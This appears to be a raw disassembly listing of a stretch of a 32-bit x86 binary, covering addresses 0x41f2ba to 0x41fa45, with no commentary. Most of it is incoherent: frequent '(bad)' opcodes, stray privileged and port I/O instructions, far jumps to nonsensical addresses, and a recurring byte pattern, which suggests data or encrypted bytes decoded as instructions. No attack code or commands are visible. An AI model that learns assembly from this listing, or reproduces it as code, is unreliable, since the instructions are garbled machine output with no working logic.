  41f2ba:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  41f2c0:	lods   eax,DWORD PTR ds:[esi]
  41f2c1:	fcomi  st,st(7)
  41f2c3:	sar    BYTE PTR [ebx],cl
  41f2c5:	(bad)  
  41f2c6:	add    BYTE PTR [esi+0x7711a0e7],dl
  41f2cc:	xchg   esp,eax
  41f2cd:	add    DWORD PTR [eax],eax
  41f2cf:	lods   al,BYTE PTR ds:[esi]
  41f2d0:	add    BYTE PTR [eax],al
  41f2d2:	add    BYTE PTR [edi+eiz*2-0x2a47c352],bl
  41f2d9:	xchg   ebp,eax
  41f2da:	std    
  41f2db:	mov    eax,ds:0x43c18d3f
  41f2e0:	sub    ebp,ebx
  41f2e2:	mov    bh,0x9b
  41f2e4:	sub    ecx,DWORD PTR [ebp-0x5b8a5baa]
  41f2ea:	dec    edi
  41f2eb:	xchg   ebx,eax
  41f2ec:	pop    es
  41f2ed:	xchg   ebp,ecx
  41f2ef:	pop    ss
  41f2f0:	ficom  DWORD PTR [eax]
  41f2f2:	push   ss
  41f2f3:	jae    0x41f304
  41f2f5:	ret    0x507f
  41f2f8:	repz pop ecx
  41f2fa:	shr    BYTE PTR [ebx+0x29a17ce2],1
  41f300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f301:	data16 jbe 0x41f2aa
  41f304:	out    dx,al
  41f305:	push   ds
  41f306:	sub    dh,BYTE PTR [esi+edi*8-0x58]
  41f30a:	mov    ds:0x7678e7ca,al
  41f30f:	jp     0x41f31f
  41f311:	cmp    edi,DWORD PTR [esp+edx*4-0x2d]
  41f315:	add    eax,0xe4fb1beb
  41f31a:	mov    eax,0x3edc7d49
  41f31f:	or     eax,0x40a323e3
  41f324:	in     al,0x4f
  41f326:	or     ecx,DWORD PTR [esi]
  41f328:	(bad)  
  41f329:	or     dh,al
  41f32b:	es mov dh,0xd3
  41f32e:	(bad)  
  41f32f:	push   ecx
  41f330:	loope  0x41f3a4
  41f332:	or     eax,0x314e4e90
  41f337:	mov    edx,0xf9bd733f
  41f33c:	fnstenv ds:0x580480fc
  41f342:	jb     0x41f2dd
  41f344:	mov    WORD PTR [edx],?
  41f346:	sbb    eax,0xe8593003
  41f34b:	or     al,0xab
  41f34d:	push   ss
  41f34e:	mov    ds:0xda144471,ax
  41f354:	mov    ebp,DWORD PTR [edx+ecx*8]
  41f357:	and    ebx,DWORD PTR [eax]
  41f359:	jecxz  0x41f390
  41f35b:	sub    eax,0x722d6292
  41f360:	xchg   esp,eax
  41f361:	jbe    0x41f35b
  41f363:	adc    DWORD PTR [edi+0x19066058],edx
  41f369:	in     al,dx
  41f36a:	ret    
  41f36b:	xchg   edi,eax
  41f36c:	shl    BYTE PTR [eax+edx*2+0xd],0x30
  41f371:	std    
  41f372:	mov    esp,DWORD PTR [esi*4-0x3c53dd89]
  41f379:	ret    
  41f37a:	push   esi
  41f37b:	jns    0x41f362
  41f37d:	add    al,0xba
	...
  41f38b:	or     bh,dh
  41f38d:	ja     0x41f3d9
  41f38f:	dec    edx
  41f391:	cmp    eax,0x2e8eedf7
  41f396:	dec    eax
  41f397:	or     eax,0x2313b305
  41f39c:	xchg   ebp,eax
  41f39d:	add    DWORD PTR [eax],eax
  41f39f:	lods   al,BYTE PTR ds:[esi]
  41f3a0:	add    BYTE PTR [eax],al
  41f3a2:	add    bh,dh
  41f3a4:	out    dx,eax
  41f3a5:	repnz retf 0x3d17
  41f3a9:	fwait
  41f3aa:	xchg   DWORD PTR [ebx-0x38],esp
  41f3ad:	fnstsw WORD PTR [ecx+0x59]
  41f3b0:	ret    
  41f3b1:	test   eax,0x7cb95815
  41f3b6:	jmp    0x5763:0x6356a84f
  41f3bd:	and    DWORD PTR [esi-0x3eae6aca],ecx
  41f3c3:	pop    edx
  41f3c4:	pop    ebp
  41f3c5:	jmp    0x41f387
  41f3c7:	pop    es
  41f3c8:	pop    ebx
  41f3c9:	vpsllq xmm3,xmm4,xmm6
  41f3cd:	cmp    BYTE PTR [esp+eiz*4],bh
  41f3d0:	and    eax,0x42a3e0e1
  41f3d5:	jg     0x41f39e
  41f3d7:	sub    DWORD PTR [edi],edx
  41f3d9:	idiv   DWORD PTR [eax]
  41f3db:	popa   
  41f3dc:	leave  
  41f3dd:	inc    ecx
  41f3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3df:	retf   
  41f3e0:	pushf  
  41f3e1:	jae    0x41f39b
  41f3e3:	push   eax
  41f3e4:	leave  
  41f3e5:	(bad)  
  41f3e6:	(bad)
  41f3ea:	outs   dx,DWORD PTR ds:[esi]
  41f3eb:	xor    cl,BYTE PTR [ebp-0x19d2b99a]
  41f3f1:	ja     0x41f386
  41f3f3:	test   eax,0xd6035446
  41f3f8:	(bad)  [edi+0x1c]
  41f3fb:	sbb    DWORD PTR [ecx+0x8ae7631],edi
  41f401:	push   cs
  41f402:	arpl   WORD PTR [ebp+0x217b79ef],si
  41f408:	(bad)  
  41f409:	rcl    BYTE PTR [ebp+0x4d],cl
  41f40c:	cmp    ecx,ecx
  41f40e:	(bad)  
  41f40f:	retf   
  41f410:	push   ds
  41f411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f412:	fmul   QWORD PTR [edx-0xb]
  41f415:	test   ebx,eax
  41f417:	mov    esi,0xb18cf5df
  41f41c:	jne    0x41f496
  41f41e:	shl    DWORD PTR [edi+edx*8+0x24],0xba
  41f423:	mov    esi,0xd318a771
  41f428:	ss jl  0x41f3e4
  41f42b:	sbb    esi,DWORD PTR [esi]
  41f42d:	ds scas al,BYTE PTR es:[edi]
  41f42f:	jle    0x41f49d
  41f431:	dec    edi
  41f432:	mov    ecx,0x54adbdcf
  41f437:	aad    0x57
  41f439:	lock aaa 
  41f43b:	inc    esi
  41f43c:	fnstenv [ecx+edi*1-0x8]
  41f440:	jmp    0x45f424a9
  41f445:	mov    bl,0x4f
  41f447:	outs   dx,DWORD PTR ds:[esi]
  41f448:	mov    cl,0x1f
  41f44a:	push   0xc96f8637
	...
  41f45b:	arpl   WORD PTR ss:[eax-0x10],bp
  41f45f:	jge    0x41f45c
  41f461:	mov    esi,0x8c7853e7
  41f466:	daa    
  41f467:	dec    edx
  41f468:	cmc    
  41f469:	aad    0x2b
  41f46b:	iret   
  41f46c:	xchg   ebp,eax
  41f46d:	add    DWORD PTR [eax],eax
  41f46f:	lods   al,BYTE PTR ds:[esi]
  41f470:	add    BYTE PTR [eax],al
  41f472:	add    BYTE PTR [esi+esi*2],bl
  41f475:	xchg   BYTE PTR [ebp+ebp*1+0x67],ah
  41f479:	xchg   esp,eax
  41f47a:	inc    edi
  41f47b:	test   BYTE PTR [eax-0x19],bh
  41f47e:	sar    DWORD PTR [ecx+0x31],0x2c
  41f482:	mov    ecx,0xa94eb148
  41f487:	repnz cs mov edi,0x7ab1db6a
  41f48e:	inc    esp
  41f48f:	push   eax
  41f490:	sub    bl,al
  41f492:	sub    DWORD PTR [edi+0x313e8e0e],0x33
  41f499:	add    ch,BYTE PTR [edi-0x413a4f1a]
  41f49f:	(bad)  
  41f4a0:	aaa    
  41f4a1:	mov    ch,0xed
  41f4a3:	call   DWORD PTR [ecx]
  41f4a5:	call   0x8784836c
  41f4aa:	push   ss
  41f4ab:	adc    al,0x9b
  41f4ad:	xor    eax,0xe8b2adc3
  41f4b2:	into   
  41f4b3:	push   esp
  41f4b4:	adc    DWORD PTR [ecx+0x2d],ecx
  41f4b7:	push   ax
  41f4b9:	push   0xd9f2b1ff
  41f4be:	hlt    
  41f4bf:	and    al,0xab
  41f4c1:	iret   
  41f4c2:	dec    eax
  41f4c3:	sub    DWORD PTR [edx],ebp
  41f4c5:	hlt    
  41f4c6:	push   ebp
  41f4c7:	jl     0x41f50f
  41f4c9:	push   edx
  41f4ca:	sub    DWORD PTR [ebx],esp
  41f4cc:	pop    ebx
  41f4cd:	test   eax,0xbbbd4766
  41f4d2:	fwait
  41f4d3:	icebp  
  41f4d4:	mov    ch,0xab
  41f4d6:	(bad)  
  41f4d7:	push   ebp
  41f4d8:	sti    
  41f4d9:	jmp    0xc3421c78
  41f4de:	xor    BYTE PTR [ebp+esi*4-0x26],ch
  41f4e2:	push   ss
  41f4e3:	mov    edi,0x938c6d6b
  41f4e8:	xchg   DWORD PTR [eax+0x77],eax
  41f4eb:	rol    DWORD PTR [edi],1
  41f4ed:	sbb    DWORD PTR ds:0x7b23133,ebx
  41f4f3:	cmp    ebx,DWORD PTR [ebx-0x39]
  41f4f6:	sahf   
  41f4f7:	ficom  WORD PTR [ecx+0x50]
  41f4fa:	fs jecxz 0x41f4c3
  41f4fd:	cld    
  41f4fe:	sub    BYTE PTR [edx+0x540c603f],bh
  41f504:	mov    eax,0x5e652a87
  41f509:	cmp    edx,ecx
  41f50b:	in     al,dx
  41f50c:	jae    0x41f4bd
  41f50e:	cmp    eax,0x975a061d
  41f513:	jmp    0xfc640f32
  41f518:	jo     0x41f576
  41f51a:	jmp    0x0:0x7350b455
	...
  41f529:	add    BYTE PTR [eax],al
  41f52b:	daa    
  41f52c:	ss lahf 
  41f52e:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f534:	and    eax,0x3881075b
  41f539:	mov    bh,0x9d
  41f53b:	aas    
  41f53c:	mov    ds:0xac0001,eax
  41f541:	add    BYTE PTR [eax],al
  41f543:	lahf   
  41f544:	add    DWORD PTR [eax],0xe65d3878
  41f54a:	jo     0x41f58b
  41f54c:	es lock jg 0x41f510
  41f550:	xchg   edi,eax
  41f551:	jecxz  0x41f50e
  41f553:	shl    BYTE PTR [esi],0x78
  41f556:	out    0x87,eax
  41f558:	inc    edi
  41f559:	xchg   edi,eax
  41f55a:	scas   al,BYTE PTR es:[edi]
  41f55b:	xor    al,0x60
  41f55d:	test   al,0x19
  41f55f:	xor    DWORD PTR [ebp+0x417504fd],eax
  41f565:	mov    BYTE PTR [edx],bh
  41f567:	pop    esp
  41f568:	les    edi,FWORD PTR [edx]
  41f56a:	push   edi
  41f56b:	sbb    edx,edx
  41f56d:	cmp    BYTE PTR [esi+0x3a],dh
  41f570:	aaa    
  41f571:	in     al,0xdf
  41f573:	mov    ds:0x1a497a77,al
  41f578:	xlat   BYTE PTR ds:[ebx]
  41f579:	(bad)
  41f57d:	adc    eax,0xc7ecfb5e
  41f582:	or     bh,BYTE PTR [esi]
  41f584:	xor    dh,cl
  41f586:	add    dl,BYTE PTR [edi]
  41f588:	rol    DWORD PTR [edx-0x1f2ac2e1],1
  41f58e:	mov    ebx,0x311765ce
  41f593:	jae    0x41f59a
  41f595:	je     0x41f5ea
  41f597:	aam    0x23
  41f599:	inc    edx
  41f59a:	sbb    edi,ecx
  41f59c:	sbb    cl,BYTE PTR [edi+0x76eb206e]
  41f5a2:	xlat   BYTE PTR ds:[ebx]
  41f5a3:	enter  0x8a60,0xc6
  41f5a7:	xchg   BYTE PTR [esi-0x1fc63b40],bh
  41f5ad:	mov    ecx,0x8fcc2ef7
  41f5b2:	int    0xde
  41f5b4:	jl     0x41f563
  41f5b6:	(bad)  
  41f5b7:	cmp    DWORD PTR [ebp+esi*1+0x34],ebx
  41f5bb:	add    DWORD PTR [eax+0x5b],edx
  41f5be:	pop    ebp
  41f5bf:	call   FWORD PTR [eax]
  41f5c1:	mov    ch,0x43
  41f5c3:	js     0x41f63c
  41f5c5:	jge    0x41f55f
  41f5c7:	(bad)  
  41f5c9:	adc    DWORD PTR [ebx-0x7b],ecx
  41f5cc:	lods   al,BYTE PTR ds:[esi]
  41f5cd:	test   DWORD PTR [edx+0x3c397501],0xb1fe0d46
  41f5d7:	cmp    ecx,DWORD PTR [ebx+0x291373b8]
  41f5dd:	mov    esp,gs
  41f5df:	jno    0x41f577
  41f5e1:	mov    ecx,0xe5b6a56f
  41f5e6:	cld    
  41f5e7:	ss jb  0x41f634
  41f5ea:	sbb    edx,edi
  41f5ec:	cmp    BYTE PTR [ecx+0xe2],al
	...
  41f5fa:	add    BYTE PTR [edi],dh
  41f5fc:	(bad)  
  41f5fd:	out    0xc2,eax
  41f5ff:	mul    ebx
  41f601:	aaa    
  41f602:	cmc    
  41f603:	xchg   ecx,eax
  41f604:	call   0x8368:0xc97aeef4
  41f60b:	jmp    0x41f5b0
  41f60d:	add    DWORD PTR [eax],eax
  41f60f:	lods   al,BYTE PTR ds:[esi]
  41f610:	add    BYTE PTR [eax],al
  41f612:	add    BYTE PTR [esi],al
  41f614:	add    esp,0xffffffcf
  41f617:	push   es
  41f618:	push   ds
  41f619:	out    0x61,al
  41f61b:	push   esp
  41f61c:	dec    edi
  41f61d:	dec    esi
  41f61e:	or     al,0xd6
  41f620:	inc    esi
  41f621:	push   ds
  41f622:	out    dx,eax
  41f623:	cmp    ch,dh
  41f625:	jbe    0x41f5ac
  41f627:	adc    al,0xea
  41f629:	xchg   ebp,eax
  41f62a:	sar    DWORD PTR [eax+0x2ede5efa],cl
  41f630:	mov    esp,0xe6525f4c
  41f635:	push   ds
  41f636:	jnp    0x41f631
  41f638:	in     eax,dx
  41f639:	inc    esp
  41f63a:	sar    BYTE PTR [esp+edx*4+0x19],1
  41f63e:	jae    0x41f650
  41f640:	pop    edi
  41f641:	jmp    0x91b3:0xdaf12635
  41f648:	test   eax,0xd9cccb1e
  41f64d:	inc    esp
  41f64e:	or     ah,BYTE PTR [ebp+0x17]
  41f651:	lea    esp,[edi]
  41f653:	dec    esi
  41f654:	in     eax,dx
  41f655:	repnz out dx,eax
  41f657:	jno    0x41f6a9
  41f659:	dec    ebp
  41f65a:	inc    ebx
  41f65b:	adc    cl,bh
  41f65d:	pop    ecx
  41f65e:	xor    al,0x99
  41f660:	call   0xbdb1fc42
  41f665:	lahf   
  41f666:	pusha  
  41f667:	or     al,0x35
  41f669:	inc    edx
  41f66a:	fisubr WORD PTR [edi+edx*2]
  41f66d:	addr16 in al,dx
  41f66f:	(bad)
  41f672:	inc    eax
  41f673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f674:	fdiv   QWORD PTR [esi-0x714e2717]
  41f67a:	xor    al,0x5f
  41f67c:	xor    al,0xd0
  41f67e:	push   DWORD PTR [ecx]
  41f680:	stos   DWORD PTR es:[edi],eax
  41f681:	push   edi
  41f682:	sar    DWORD PTR [edi+0x44],0xfd
  41f686:	mov    ebp,0x26923c02
  41f68b:	fisub  DWORD PTR [ebx-0x1543e30f]
  41f691:	ficom  WORD PTR [ebp-0x15]
  41f694:	xchg   edi,eax
  41f695:	mov    gs,ebx
  41f697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f698:	sub    ecx,ebp
  41f69a:	sbb    eax,0x364b12af
  41f69f:	push   edi
  41f6a0:	pop    ss
  41f6a1:	mov    dh,0x5a
  41f6a3:	sbb    bl,dl
  41f6a5:	jne    0x41f63c
  41f6a7:	adc    cl,BYTE PTR [ebp-0x1da6fef5]
  41f6ad:	mov    eax,0x7991d4f6
  41f6b2:	adc    eax,0x7ae05886
  41f6b7:	mov    edi,0x2d8a35
  41f6bc:	adc    edx,esi
  41f6be:	mov    BYTE PTR [eax],0x0
	...
  41f6c9:	add    BYTE PTR [eax],al
  41f6cb:	push   ss
  41f6cc:	aad    0xdf
  41f6ce:	out    dx,eax
  41f6cf:	fucomip st,st(7)
  41f6d1:	ss std 
  41f6d3:	cmp    BYTE PTR [esi+0x10ae5f3a],al
  41f6d9:	int3   
  41f6da:	out    0x97,al
  41f6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6dd:	add    DWORD PTR [eax],eax
  41f6df:	lods   al,BYTE PTR ds:[esi]
  41f6e0:	add    BYTE PTR [eax],al
  41f6e2:	add    BYTE PTR [eax+0x764ebf33],bh
  41f6e8:	dec    eax
  41f6e9:	fdivr  QWORD PTR [edx+0x1d]
  41f6ec:	and    ebp,ebp
  41f6ee:	in     eax,0xeb
  41f6f0:	nop
  41f6f1:	sbb    DWORD PTR [esi-0x3d11b8ad],0xffffff96
  41f6f8:	out    0x5d,eax
  41f6fa:	cmp    BYTE PTR es:[esi],bl
  41f6fd:	jo     0x41f71c
  41f6ff:	cmp    eax,0xc0ff1d3
  41f704:	in     al,0x87
  41f706:	pop    esi
  41f707:	dec    esi
  41f708:	popf   
  41f709:	push   ecx
  41f70a:	and    eax,0xf14e546
  41f70f:	fs push esi
  41f711:	(bad)
  41f714:	(bad)  
  41f715:	dec    si
  41f717:	in     al,dx
  41f718:	outs   dx,DWORD PTR ds:[esi]
  41f719:	repz sti 
  41f71b:	enter  0xd422,0xdf
  41f71f:	int    0x89
  41f721:	ret    
  41f722:	cli    
  41f723:	fidiv  DWORD PTR [esi]
  41f725:	cmp    BYTE PTR [edx-0x6a126d0a],cl
  41f72b:	or     eax,0x8bd70f0
  41f730:	add    DWORD PTR [eax-0x78a01c27],edx
  41f736:	(bad)  
  41f737:	mov    esp,0x3d3d6a42
  41f73c:	(bad)  
  41f73e:	pop    ds
  41f73f:	lea    esp,ds:0x910a8359
  41f745:	les    edx,FWORD PTR [edx+eax*4-0x2]
  41f749:	cmp    cl,BYTE PTR [eax-0x7d]
  41f74c:	loope  0x41f76b
  41f74e:	push   edi
  41f74f:	imul   esi,DWORD PTR [eax+edi*4],0x50
  41f753:	fpatan 
  41f755:	inc    ecx
  41f756:	dec    edi
  41f757:	pusha  
  41f758:	push   esi
  41f759:	mov    eax,ds:0x72b8691d
  41f75e:	inc    edx
  41f75f:	cmp    DWORD PTR [ecx],0xffffffa5
  41f762:	add    esp,ebp
  41f764:	sub    bh,dl
  41f766:	mov    ds:0x62cd80ce,al
  41f76b:	arpl   WORD PTR [esi-0x11f9d102],bx
  41f771:	bound  ebp,QWORD PTR [ebx-0x54]
  41f774:	sbb    eax,0x2bb68d02
  41f779:	and    ecx,0x66eed4c0
  41f77f:	(bad)  
  41f780:	mov    edx,0xeadebf32
  41f785:	cli    
  41f786:	in     al,0x30
  41f788:	sbb    edi,eax
  41f78a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f78b:	push   ebp
  41f78c:	xor    DWORD PTR [eax+0x28],edx
	...
  41f79b:	outs   dx,BYTE PTR ds:[esi]
  41f79c:	jbe    0x41f782
  41f79e:	retf   0xdafc
  41f7a1:	outs   dx,BYTE PTR ds:[esi]
  41f7a2:	neg    BYTE PTR [eax]
  41f7a4:	xchg   edx,eax
  41f7a5:	xchg   DWORD PTR [edi-0x96f1bd1],edx
  41f7ab:	inc    ebx
  41f7ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7ad:	add    DWORD PTR [eax],eax
  41f7af:	lods   al,BYTE PTR ds:[esi]
  41f7b0:	add    BYTE PTR [eax],al
  41f7b2:	add    BYTE PTR [esi-0xd],ch
  41f7b5:	dec    edi
  41f7b6:	aam    0x3d
  41f7b8:	ss cs (bad) 
  41f7bb:	push   ebp
  41f7bc:	jmp    0x41f83c
  41f7be:	sahf   
  41f7bf:	adc    al,0xd3
  41f7c1:	and    ebp,0xffffffd2
  41f7c4:	aad    0x95
  41f7c6:	inc    edi
  41f7c7:	out    0x8d,al
  41f7c9:	(bad)  
  41f7ca:	call   0x245f92cf
  41f7cf:	ret    
  41f7d0:	xchg   esi,eax
  41f7d1:	jne    0x41f805
  41f7d3:	aam    0x73
  41f7d5:	mov    esi,0x99e9b6e1
  41f7da:	add    DWORD PTR [edx-0x44d66a72],0x31
  41f7e1:	sub    cl,BYTE PTR [edx+0x32]
  41f7e4:	inc    esp
  41f7e5:	pop    ebx
  41f7e6:	leave  
  41f7e7:	cmp    eax,0x8542a73d
  41f7ec:	aam    0xe3
  41f7ee:	inc    eax
  41f7ef:	lods   eax,DWORD PTR ds:[esi]
  41f7f0:	xor    cl,BYTE PTR [edi]
  41f7f2:	xchg   ebx,ebp
  41f7f4:	ds add al,0xd2
  41f7f7:	push   0xf411855
  41f7fc:	jle    0x41f825
  41f7fe:	fsubp  st(3),st
  41f800:	or     DWORD PTR [esp+edi*8],edx
  41f803:	popa   
  41f804:	pop    ss
  41f805:	inc    ecx
  41f806:	stos   DWORD PTR es:[edi],eax
  41f807:	out    dx,al
  41f808:	icebp  
  41f809:	push   eax
  41f80a:	push   esi
  41f80b:	hlt    
  41f80c:	xchg   esp,eax
  41f80d:	xchg   BYTE PTR [eax+0x16aea767],bh
  41f813:	inc    esp
  41f814:	cmp    DWORD PTR [eax+0x2d],esi
  41f817:	add    al,BYTE PTR [edx-0x7bc0e638]
  41f81d:	sub    al,0xc8
  41f81f:	cmp    eax,0xf4534cec
  41f824:	into   
  41f825:	je     0x41f7b7
  41f827:	sbb    edi,DWORD PTR [ebx]
  41f829:	xlat   BYTE PTR gs:[ebx]
  41f82b:	push   es
  41f82c:	sti    
  41f82d:	pop    ecx
  41f82e:	addr16 sti 
  41f830:	sahf   
  41f831:	pop    edi
  41f832:	(bad)  
  41f833:	cmp    eax,0x57916832
  41f838:	xchg   esp,eax
  41f839:	clc    
  41f83a:	js     0x41f84d
  41f83c:	pop    esp
  41f83d:	jge    0x41f84e
  41f83f:	cmp    eax,0xb9bb3c48
  41f844:	enter  0x70f1,0x83
  41f848:	or     DWORD PTR [eax+esi*8],ebx
  41f84b:	lods   al,BYTE PTR ds:[esi]
  41f84c:	imul   esi,DWORD PTR [ecx+0x4b],0xe
  41f850:	mov    edi,0xe0674227
  41f855:	ins    BYTE PTR es:[edi],dx
  41f856:	sub    al,0x3e
  41f858:	xchg   edx,eax
  41f859:	and    al,0x43
  41f85b:	add    esi,ebp
  41f85d:	mov    ebx,0xbe
	...
  41f86a:	add    BYTE PTR [edx],bh
  41f86c:	push   edx
  41f86d:	les    ecx,FWORD PTR [edi]
  41f86f:	in     al,dx
  41f870:	lahf   
  41f871:	sti    
  41f872:	ja     0x41f86a
  41f874:	rcl    DWORD PTR [eax-0x3393c52d],1
  41f87a:	stc    
  41f87b:	out    dx,eax
  41f87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f87d:	add    DWORD PTR [eax],eax
  41f87f:	lods   al,BYTE PTR ds:[esi]
  41f880:	add    BYTE PTR [eax],al
  41f882:	add    BYTE PTR [edi+edi*8-0x4c],bl
  41f886:	mov    es,WORD PTR [ebx]
  41f888:	inc    edi
  41f889:	jb     0x41f8eb
  41f88b:	imul   BYTE PTR [edi]
  41f88d:	adc    BYTE PTR [esi+0x63],bl
  41f890:	loop   0x41f87d
  41f892:	mov    ebp,0xeefe176d
  41f897:	jnp    0x41f913
  41f899:	add    BYTE PTR [ebp-0x36],dl
  41f89c:	dec    eax
  41f89d:	loop   0x41f873
  41f89f:	out    0xa9,al
  41f8a1:	out    dx,eax
  41f8a2:	ins    DWORD PTR es:[edi],dx
  41f8a3:	repnz iret 
  41f8a5:	inc    ecx
  41f8a6:	sbb    dl,BYTE PTR [edi-0x78]
  41f8a9:	or     cx,WORD PTR [eax]
  41f8ac:	pop    es
  41f8ad:	test   eax,0x45557d80
  41f8b2:	fidiv  DWORD PTR [edx+0xdde6ed7]
  41f8b8:	nop
  41f8b9:	leave  
  41f8ba:	pop    ebp
  41f8bb:	push   ds
  41f8bc:	ins    BYTE PTR es:[edi],dx
  41f8bd:	push   ebp
  41f8be:	push   0xc4ee948
  41f8c3:	(bad)  
  41f8c4:	jp     0x41f915
  41f8c6:	sub    DWORD PTR [edx+eiz*1],eax
  41f8c9:	fst    DWORD PTR [esi+ecx*2]
  41f8cc:	dec    ebx
  41f8cd:	jo     0x41f85f
  41f8cf:	jne    0x41f871
  41f8d1:	dec    edi
  41f8d2:	push   edi
  41f8d3:	leave  
  41f8d4:	es dec edi
  41f8d6:	sbb    esi,DWORD PTR [edi+0x57d5d8ca]
  41f8dc:	imul   esp,ebp,0xffffffcd
  41f8df:	iret   
  41f8e0:	stos   BYTE PTR es:[edi],al
  41f8e1:	or     cl,BYTE PTR [esi+0x29]
  41f8e4:	jno    0x41f913
  41f8e6:	jb     0x41f905
  41f8e8:	jl     0x41f8be
  41f8ea:	cmp    eax,0x797ed8ba
  41f8ef:	sbb    BYTE PTR [eax+0x9],bl
  41f8f2:	inc    edx
  41f8f3:	test   dl,dl
  41f8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8f6:	sbb    cl,bl
  41f8f8:	stos   BYTE PTR es:[edi],al
  41f8f9:	dec    edi
  41f8fa:	repz inc esi
  41f8fc:	and    DWORD PTR [ecx+0x70ceacf3],esi
  41f902:	aad    0x82
  41f904:	rcl    esi,cl
  41f906:	fcomp  st(6)
  41f908:	sti    
  41f909:	adc    eax,0x4540ba85
  41f90e:	jge    0x41f983
  41f910:	mov    ah,0x6d
  41f912:	pop    ebx
  41f913:	dec    ecx
  41f914:	outs   dx,BYTE PTR ds:[esi]
  41f915:	dec    edx
  41f916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f917:	xor    BYTE PTR [edx-0x413f66ee],bh
  41f91d:	inc    ecx
  41f91e:	repz xor DWORD PTR [edx+0x5c],edx
  41f922:	jle    0x41f955
  41f924:	mov    edi,0xcdd6c38b
  41f929:	pop    ebp
  41f92a:	sbb    DWORD PTR [edi+0x3a],0xd715
	...
  41f939:	add    BYTE PTR [eax],al
  41f93b:	xchg   ebx,eax
  41f93c:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  41f943:	push   eax
  41f944:	loopne 0x41f940
  41f946:	call   0xa69b:0xac6665dd
  41f94d:	add    DWORD PTR [eax],eax
  41f94f:	lods   al,BYTE PTR ds:[esi]
  41f950:	add    BYTE PTR [eax],al
  41f952:	add    BYTE PTR ds:0xeae21439,cl
  41f958:	and    ah,dh
  41f95a:	or     DWORD PTR [esi+esi*8-0x4cbedf1a],esp
  41f961:	retf   
  41f962:	inc    ebx
  41f963:	xchg   ebx,eax
  41f964:	(bad)  
  41f965:	pop    ss
  41f966:	(bad)  
  41f967:	jg     0x41f9a1
  41f969:	pop    ds
  41f96a:	cmp    al,0x57
  41f96c:	sbb    BYTE PTR [esi-0x7cbf57ea],dh
  41f972:	inc    ecx
  41f973:	mov    ds:0x586ea124,eax
  41f978:	leave  
  41f979:	xchg   edx,eax
  41f97a:	sub    BYTE PTR cs:[edx],ah
  41f97d:	daa    
  41f97e:	fsubr  DWORD PTR [ebp+0x20b6be50]
  41f984:	xchg   BYTE PTR [ebx],dl
  41f986:	pusha  
  41f987:	rcr    BYTE PTR [ecx+edi*8],1
  41f98a:	add    BYTE PTR [eax],ch
  41f98c:	in     eax,0x1
  41f98e:	adc    DWORD PTR [ebp+0x1b],0x20bab536
  41f995:	sbb    eax,0xcaeba08f
  41f99a:	jne    0x41f9d6
  41f99c:	cmp    al,0x5a
  41f99e:	push   edi
  41f99f:	scas   eax,DWORD PTR es:[edi]
  41f9a0:	mov    dl,0x14
  41f9a2:	sbb    al,0x3d
  41f9a4:	repnz daa 
  41f9a6:	fs loopne 0x41f941
  41f9a9:	pop    edi
  41f9aa:	mov    eax,ds:0x4ef50846
  41f9af:	inc    esi
  41f9b0:	ja     0x41f975
  41f9b2:	adc    eax,0xb3ba9778
  41f9b7:	add    BYTE PTR [edx+0x57],al
  41f9ba:	jge    0x41f95a
  41f9bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9bd:	dec    eax
  41f9be:	mov    ch,0x2f
  41f9c0:	cdq    
  41f9c1:	inc    edi
  41f9c2:	push   cs
  41f9c3:	xchg   ebx,eax
  41f9c4:	sbb    dh,ah
  41f9c6:	and    eax,0x19cf66dc
  41f9cb:	(bad)  
  41f9cc:	es out 0xfb,eax
  41f9cf:	xlat   BYTE PTR ds:[ebx]
  41f9d0:	in     eax,dx
  41f9d1:	jge    0x41f9f0
  41f9d3:	clc    
  41f9d4:	sub    cl,BYTE PTR [edi+0x565115b7]
  41f9da:	int3   
  41f9db:	or     eax,0x7ac42a6b
  41f9e0:	nop
  41f9e1:	stos   DWORD PTR es:[edi],eax
  41f9e2:	mov    edx,0x23295906
  41f9e7:	mov    DWORD PTR [ecx],ebx
  41f9e9:	add    eax,DWORD PTR [ebp-0x67]
  41f9ec:	cmp    bh,BYTE PTR [edx]
  41f9ee:	cli    
  41f9ef:	lods   eax,DWORD PTR ds:[esi]
  41f9f0:	pop    es
  41f9f1:	mov    ebp,0x725a9eb
  41f9f6:	jae    0x41fa60
  41f9f8:	fadd   DWORD PTR [edi+0x74aa6908]
  41f9fe:	les    eax,FWORD PTR [eax]
	...
  41fa08:	add    BYTE PTR [eax],al
  41fa0a:	add    ah,bl
  41fa0c:	fincstp 
  41fa0e:	shl    bh,0xee
  41fa11:	(bad)  
  41fa12:	frstor [ecx+eax*1]
  41fa15:	pop    ebp
  41fa16:	dec    edi
  41fa17:	or     edx,DWORD PTR [edx+0x47]
  41fa1a:	repz inc edi
  41fa1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa1d:	add    DWORD PTR [eax],eax
  41fa1f:	lods   al,BYTE PTR ds:[esi]
  41fa20:	add    BYTE PTR [eax],al
  41fa22:	add    BYTE PTR [esp+ebp*2-0x53],dl
  41fa26:	cmp    dl,BYTE PTR [edx]
  41fa28:	mov    al,0x7
  41fa2a:	not    DWORD PTR [ecx]
  41fa2c:	icebp  
  41fa2d:	gs call 0x5812cbfa
  41fa33:	scas   al,BYTE PTR es:[edi]
  41fa34:	dec    ecx
  41fa35:	adc    ebx,DWORD PTR [edx-0x74a66acb]
  41fa3b:	pop    ebx
  41fa3c:	push   esi
  41fa3d:	jle    0x41fa5f
  41fa3f:	fwait
  41fa40:	push   ds
  41fa41:	xchg   esp,eax
  41fa42:	pop    edx
  41fa43:	or     esp,DWORD PTR [ebx]
  41fa45:	rcl    BYTE PTR [edi-0x4b],1
